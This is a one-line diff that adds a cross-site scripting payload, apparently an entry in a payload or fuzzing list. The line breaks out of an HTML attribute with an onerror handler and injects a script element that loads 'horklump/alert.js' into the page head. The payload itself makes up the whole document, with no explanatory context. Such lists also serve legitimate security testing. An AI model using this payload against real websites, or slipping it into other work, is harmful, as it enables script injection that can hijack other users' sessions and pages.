@@ -1,0 +1,1 @@
+' onerror='d=document;s=d.createElement("script");s.setAttribute("src","horklump/alert.js");d.getElementsByTagName("head")[0].appendChild(s);
